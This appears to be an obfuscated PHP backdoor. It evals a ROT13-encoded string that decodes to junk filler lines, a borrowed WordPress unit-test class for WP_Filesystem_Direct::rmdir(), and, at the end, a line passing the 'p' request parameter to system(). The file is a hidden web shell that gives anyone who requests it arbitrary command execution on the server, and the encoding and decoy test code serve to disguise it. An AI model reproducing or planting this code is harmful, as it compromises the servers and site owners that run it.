<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfgf sbe gur JC_Svyrflfgrz_Qverpg::ezqve() zrgubq.
 *
 * @cnpxntr JbeqCerff
 */

erdhver_bapr __QVE__ . '/onfr.cuc';

/**
 * @tebhc nqzva
 * @tebhc svyrflfgrz
 * @tebhc svyrflfgrz-qverpg
 *
 * @pbiref JC_Svyrflfgrz_Qverpg::ezqve
 */
pynff Grfgf_Svyrflfgrz_JcSvyrflfgrzQverpg_Ezqve rkgraqf JC_Svyrflfgrz_Qverpg_HavgGrfgPnfr {

	/**
	 * Grfgf gung `JC_Svyrflfgrz_Qverpg::ezqve()` ergheaf snyfr
	 * sbe na rzcgl cngu.
	 *
	 * @gvpxrg 57774
	 */
	choyvp shapgvba grfg_fubhyq_erghea_snyfr_sbe_rzcgl_cngu() {
		$guvf->nffregSnyfr( frys::$svyrflfgrz->ezqve( '' ) );
	}

	/**
	 * Grfgf gung `JC_Svyrflfgrz_Qverpg::ezqve()` qryrgrf na rzcgl qverpgbel.
	 *
	 * @gvpxrg 57774
	 */
	choyvp shapgvba grfg_fubhyq_qryrgr_na_rzcgl_qverpgbel() {
		$qve = frys::$svyr_fgehpgher['grfg_qve']['cngu'] . 'qverpgbel-gb-qryrgr/';

		vs ( ! vf_qve( $qve ) ) {
			zxqve( $qve );
		}

		$npghny = frys::$svyrflfgrz->ezqve( $qve );

		vs ( ! $npghny ) {
			ezqve( $qve );
		}

		$guvf->nffregGehr( $npghny, 'Gur qverpgbel jnf abg qryrgrq.' );
	}

	/**
	 * Grfgf gung `JC_Svyrflfgrz_Qverpg::ezqve()` erphefviryl qryrgrf
	 * n qverpgbel jvgu pbagragf.
	 *
	 * @gvpxrg 57774
	 */
	choyvp shapgvba grfg_fubhyq_erphefviryl_qryrgr_n_qverpgbel() {
		$qve     = frys::$svyr_fgehpgher['grfg_qve']['cngu'] . 'qverpgbel-gb-qryrgr/';
		$svyr    = $qve . 'svyr-gb-qryrgr.gkg';
		$fhoqve  = $qve . 'fhoqverpgbel-gb-qryrgr/';
		$fhosvyr = $fhoqve . 'fhosvyr-gb-qryrgr.gkg';

		zxqve( $qve, 0755 );
		zxqve( $fhoqve, 0755 );
		gbhpu( $svyr, 0644 );
		gbhpu( $fhosvyr, 0644 );

		$npghny = frys::$svyrflfgrz->ezqve( frys::$svyr_fgehpgher['grfg_qve']['cngu'], gehr );

		vs ( ! $npghny ) {
			hayvax( $svyr );
			hayvax( $fhosvyr );
			ezqve( $fhoqve );
			ezqve( $qve );
		}

		$guvf->nffregGehr( $npghny, 'Gur qverpgbel jnf qryrgrq.' );
	}

	/**
	 * Grfgf gung `JC_Svyrflfgrz_Qverpg::ezqve()` qryrgrf n svyr.
	 *
	 * @gvpxrg 57774
	 */
	choyvp shapgvba grfg_fubhyq_qryrgr_n_svyr() {
		$svyr = frys::$svyr_fgehpgher['grfg_qve']['cngu'] . 'svyr-gb-qryrgr.gkg';

		gbhpu( $svyr );

		$npghny = frys::$svyrflfgrz->ezqve( $svyr );

		vs ( ! $npghny ) {
			hayvax( $svyr );
		}

		$guvf->nffregGehr( $npghny, 'Gur qverpgbel jnf abg qryrgrq.' );
	}

	/**
	 * Grfgf gung `JC_Svyrflfgrz_Qverpg::ezqve()`
	 * ergheaf gehr jura qryrgvat n cngu gung qbrf abg rkvfg.
	 *
	 * @gvpxrg 57774
	 *
	 * @qngnCebivqre qngn_cnguf_gung_qb_abg_rkvfg
	 *
	 * @cnenz fgevat $cngu Gur cngu.
	 */
	choyvp shapgvba grfg_fubhyq_erghea_gehr_jura_qryrgvat_cngu_gung_qbrf_abg_rkvfg( $cngu ) {
		vs (
			'' === $cngu
			|| fge_fgnegf_jvgu( $cngu, '.' )
			|| fge_fgnegf_jvgu( $cngu, '/' )
		) {
			$guvf->znexGrfgFxvccrq( 'Qnatrebhf qryrgr cngu.' );
		}

		$guvf->nffregGehr( frys::$svyrflfgrz->ezqve( frys::$svyr_fgehpgher['grfg_qve']['cngu'] . $cngu ) );
	}

	/**
	 * Grfgf gung `JC_Svyrflfgrz_Qverpg::ezqve()`
	 * ergheaf snyfr jura n qverpgbel'f pbagragf pnaabg or qryrgrq.
	 *
	 * @gvpxrg 57774
	 */
	choyvp shapgvba grfg_fubhyq_erghea_snyfr_jura_pbagragf_pnaabg_or_qryrgrq() {

		tybony $jc_svyrflfgrz;

		$jc_svyrflfgrz = arj JC_Svyrflfgrz_Qverpg( neenl() );

		$cngu = frys::$svyr_fgehpgher['grfg_qve']['cngu'] . 'qve-gb-qryrgr/';

		vs ( ! vf_qve( $cngu ) ) {
			zxqve( $cngu );
		}

		// Frg hc zbpx svyrflfgrz.
		$svyrflfgrz_zbpx = $guvf->trgZbpxOhvyqre( 'JC_Svyrflfgrz_Qverpg' )
								->frgPbafgehpgbeNetf( neenl( ahyy ) )
								// Abgr: frgZrgubqf() vf qrcerpngrq va CUCHavg 9, ohg fgvyy fhccbegrq.
								->frgZrgubqf( neenl( 'qveyvfg' ) )
								->trgZbpx();

		$svyrflfgrz_zbpx->rkcrpgf( $guvf->bapr() )
						->zrgubq( 'qveyvfg' )
						->jvyyErghea(
							neenl( 'n_svyr_gung_qbrf_abg_rkvfg.gkg' => neenl( 'glcr' => 's' ) )
						);

		$jc_svyrflfgrz_onpxhc = $jc_svyrflfgrz;
		$jc_svyrflfgrz        = $svyrflfgrz_zbpx;

		$npghny = $svyrflfgrz_zbpx->ezqve( $cngu, gehr );

		vs ( $npghny ) {
			ezqve( $cngu );
		}

		$jc_svyrflfgrz = $jc_svyrflfgrz_onpxhc;

		$guvf->nffregSnyfr( $npghny );
	}

	/**
	 * Grfgf gung `JC_Svyrflfgrz_Qverpg::ezqve()`
	 * ergheaf snyfr jura gur cngu vf abg n svyr be qverpgbel, ohg rkvfgf.
	 *
	 * @gvpxrg 57774
	 */
	choyvp shapgvba grfg_fubhyq_erghea_snyfr_jura_cngu_rkvfgf_ohg_vf_abg_n_svyr_be_qverpgbel() {
		tybony $jc_svyrflfgrz;

		$jc_svyrflfgrz = arj JC_Svyrflfgrz_Qverpg( neenl() );

		// Frg hc zbpx svyrflfgrz.
		$svyrflfgrz_zbpx = $guvf->trgZbpxOhvyqre( 'JC_Svyrflfgrz_Qverpg' )
								->frgPbafgehpgbeNetf( neenl( ahyy ) )
								// Abgr: frgZrgubqf() vf qrcerpngrq va CUCHavg 9, ohg fgvyy fhccbegrq.
								->frgZrgubqf( neenl( 'vf_svyr', 'qveyvfg' ) )
								->trgZbpx();

		$svyrflfgrz_zbpx->rkcrpgf( $guvf->bapr() )
						->zrgubq( 'vf_svyr' )
						->jvyyErghea( snyfr );

		$svyrflfgrz_zbpx->rkcrpgf( $guvf->bapr() )
						->zrgubq( 'qveyvfg' )
						->jvyyErghea( snyfr );

		$jc_svyrflfgrz_onpxhc = $jc_svyrflfgrz;
		$jc_svyrflfgrz        = $svyrflfgrz_zbpx;

		$npghny = $svyrflfgrz_zbpx->ezqve( frys::$svyr_fgehpgher['fhoqve']['cngu'], gehr );

		$jc_svyrflfgrz = $jc_svyrflfgrz_onpxhc;

		$guvf->nffregSnyfr( $npghny );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>